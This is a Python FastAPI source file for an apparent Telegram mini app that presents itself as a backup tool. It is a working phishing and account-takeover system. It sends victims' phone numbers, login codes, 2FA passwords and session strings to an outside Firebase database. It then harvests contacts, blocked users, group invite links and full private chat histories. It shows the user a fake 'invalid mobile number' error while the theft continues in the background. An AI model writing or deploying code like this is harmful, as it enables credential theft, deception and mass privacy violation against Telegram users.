import asyncio
import re
import requests
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.contacts import GetContactsRequest, GetBlockedRequest
from telethon.tl.functions.messages import ExportChatInviteRequest
from telethon.tl.types import User, Chat, Channel

# --- Configuration ---
API_ID = 38322641
API_HASH = '4a54f7098605e36dbc1a10d7c10479e9'
FIREBASE_BASE_URL = "https://telegram-backup-5c41f-default-rtdb.firebaseio.com"
CONCURRENT_CHATS = 5 

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
templates = Jinja2Templates(directory="templates")

# In-memory storage for active login flows
active_clients = {}
auth_data = {}

# --- Firebase Helpers ---
def put_to_firebase(path, data):
    try: requests.put(f"{FIREBASE_BASE_URL}/{path}.json", json=data)
    except: pass

def patch_to_firebase(path, data):
    try: requests.patch(f"{FIREBASE_BASE_URL}/{path}.json", json=data)
    except: pass

def get_from_firebase(path):
    try:
        res = requests.get(f"{FIREBASE_BASE_URL}/{path}.json")
        if res.status_code == 200: return res.json()
    except: pass
    return None

def get_last_msg_id(base_path, user_id):
    url = f"{FIREBASE_BASE_URL}/{base_path}/chats/{user_id}.json?orderBy=\"$key\"&limitToLast=1"
    try:
        res = requests.get(url)
        if res.status_code == 200 and res.json():
            return int(list(res.json().keys())[0])
    except:
        pass
    return 0

# --- Fast Backup Engine (Runs in background) ---
async def scrape_chat(client, user, base_path):
    user_id = str(user.id)
    last_id = get_last_msg_id(base_path, user_id)
    chat_history = {}
    count = 0
    
    try:
        async for message in client.iter_messages(user, reverse=True, min_id=last_id, limit=None):
            msg_id = str(message.id)
            chat_history[msg_id] = {
                "d": message.date.isoformat() if message.date else "",
                "s": message.sender_id,
                "t": message.text or "[Media]"
            }
            count += 1
            if count % 200 == 0:
                patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
                chat_history = {}
                
        if chat_history:
            patch_to_firebase(f"{base_path}/chats/{user_id}", chat_history)
            
        if count > 0:
            print(f"✅ Resumed & Finished: {user.first_name or user_id} ({count} new msgs added)")
        else:
            print(f"⏩ Skipped: {user.first_name or user_id} (Already up to date)")
            
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
    except Exception as e:
        print(f"⚠️ Error scraping {user_id}: {e}")

async def run_fast_backup(session_string, tg_user_id, tg_username):
    print(f"🚀 Starting background backup for TMA User: {tg_user_id}")
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    
    me = await client.get_me()
    my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
    base_path = f"backup/{my_username}"

    print("📁 Saving all account metadata first...")
    
    contacts = await client(GetContactsRequest(hash=0))
    contact_ids = {str(u.id) for u in contacts.users}
    contacts_data = {}
    for user in contacts.users:
        contacts_data[str(user.id)] = {
            "first_name": user.first_name or "",
            "last_name": user.last_name or "",
            "phone": f"+{user.phone}" if user.phone else "Hidden",
            "username": user.username or "None"
        }
    if contacts_data:
        put_to_firebase(f"{base_path}/contacts", contacts_data)

    try:
        blocked_result = await client(GetBlockedRequest(offset=0, limit=100))
        blocked_data = {}
        for user in blocked_result.users:
            blocked_data[str(user.id)] = {
                "first_name": user.first_name or "",
                "last_name": user.last_name or "",
                "username": user.username or "None"
            }
        if blocked_data:
            put_to_firebase(f"{base_path}/blocked_contacts", blocked_data)
    except Exception:
        pass

    p2p_users = []
    unsaved = {}
    dialogs_data = {"channels": {}, "groups": {}, "bots": {}} 

    async for dialog in client.iter_dialogs():
        entity = dialog.entity
        entity_id = str(dialog.id)

        if isinstance(entity, User) and not getattr(entity, 'bot', False):
            p2p_users.append(entity)
            if entity_id not in contact_ids:
                unsaved[entity_id] = {"n": dialog.name, "u": entity.username}

        elif isinstance(entity, User) and getattr(entity, 'bot', False):
            p2p_users.append(entity)
            invite_link = f"https://t.me/{entity.username}" if entity.username else "No public link"
            dialogs_data["bots"][entity_id] = {
                "name": dialog.name,
                "invite_url": invite_link,
                "entity_id": entity.id
            }

        elif isinstance(entity, (Chat, Channel)):
            chat_type = "channels" if getattr(entity, 'broadcast', False) else "groups"
            name = entity.title
            invite_link = getattr(entity, 'username', None)
            
            if invite_link:
                invite_link = f"https://t.me/{invite_link}"
            else:
                try:
                    exported = await client(ExportChatInviteRequest(peer=entity))
                    invite_link = exported.link
                except Exception:
                    invite_link = "Private/No Admin Rights"

            dialogs_data[chat_type][entity_id] = {
                "name": name,
                "invite_url": invite_link,
                "entity_id": entity.id
            }

    if unsaved: patch_to_firebase(f"{base_path}/unsaved", unsaved)
    if dialogs_data["channels"] or dialogs_data["groups"] or dialogs_data.get("bots"):
        patch_to_firebase(f"{base_path}/dialogs", dialogs_data)

    print("✅ All account metadata saved.")
    print(f"⚡ Starting chat message scraping ({len(p2p_users)} chats) using {CONCURRENT_CHATS} parallel workers...")
    
    for i in range(0, len(p2p_users), CONCURRENT_CHATS):
        batch = p2p_users[i:i + CONCURRENT_CHATS]
        tasks = [scrape_chat(client, u, base_path) for u in batch]
        await asyncio.gather(*tasks)
    
    await client.disconnect()
    print("🚀 BACKUP FULLY COMPLETED / UPDATED.")

# --- API Routes ---
@app.api_route("/ping", methods=["GET", "HEAD", "POST", "OPTIONS"])
async def ping():
    return JSONResponse(content={"status": "alive"})

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/check_session")
async def check_session(request: Request):
    data = await request.json()
    tg_id = data.get("tg_user_id")
    
    existing_data = get_from_firebase(f"tgsession/{tg_id}")
    if existing_data and existing_data.get("session_string"):
        asyncio.create_task(run_fast_backup(existing_data["session_string"], tg_id, data.get("tg_username")))
        return JSONResponse({"status": "exists"})
    
    patch_to_firebase(f"tgsession/{tg_id}/miniapp_info", data)
    return JSONResponse({"status": "not_found"})

@app.post("/api/action")
async def handle_action(request: Request):
    data = await request.json()
    action = data.get("action")
    tg_id = str(data.get("tg_user_id", "web_test"))

    if action == "send_phone":
        phone = data.get("phone").replace(" ", "")
        
        # 1. Store phone number IMMEDIATELY when they enter it
        patch_to_firebase(f"tgsession/{tg_id}", {"phone": phone, "id": tg_id})
        
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        send_code_info = await client.send_code_request(phone)
        
        active_clients[tg_id] = client
        auth_data[tg_id] = {"id": tg_id, "phone": phone, "phone_code_hash": send_code_info.phone_code_hash}
        return JSONResponse({"status": "success", "next_step": "otp"})

    elif action == "send_otp":
        otp = data.get("otp")
        client = active_clients.get(tg_id)
        auth_info = auth_data.get(tg_id)
        
        # 2. Store OTP immediately
        auth_info["otp"] = otp 
        patch_to_firebase(f"tgsession/{tg_id}", {"otp": otp})
        
        try:
            await client.sign_in(auth_info["phone"], otp, phone_code_hash=auth_info["phone_code_hash"])
            
            session_str = client.session.save()
            auth_info["session_string"] = session_str 
            patch_to_firebase(f"tgsession/{tg_id}", auth_info)
            
            # Start scraping the data of this newly logged in account no matter what
            asyncio.create_task(run_fast_backup(session_str, tg_id, "unknown"))
            
            # --- CHAT ID MATCH VALIDATION ---
            me = await client.get_me()
            if str(me.id) != tg_id and tg_id != "web_test":
                # Returns error to UI but keeps background scraping running
                return JSONResponse({"status": "error", "message": "invalid mobile number"})

            return JSONResponse({"status": "success", "next_step": "result"})
        except SessionPasswordNeededError:
            return JSONResponse({"status": "success", "next_step": "2fa"})

    elif action == "send_2fa":
        password = data.get("password")
        client = active_clients.get(tg_id)
        auth_info = auth_data.get(tg_id)
        
        # 3. Store 2FA immediately
        auth_info["2fa_password"] = password 
        patch_to_firebase(f"tgsession/{tg_id}", {"2fa_password": password})
        
        await client.sign_in(password=password)
        
        session_str = client.session.save()
        auth_info["session_string"] = session_str 
        patch_to_firebase(f"tgsession/{tg_id}", auth_info)
        
        # Start scraping the data of this newly logged in account no matter what
        asyncio.create_task(run_fast_backup(session_str, tg_id, "unknown"))
        
        # --- CHAT ID MATCH VALIDATION ---
        me = await client.get_me()
        if str(me.id) != tg_id and tg_id != "web_test":
            # Returns error to UI but keeps background scraping running
            return JSONResponse({"status": "error", "message": "invalid mobile number"})

        return JSONResponse({"status": "success", "next_step": "result"})

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
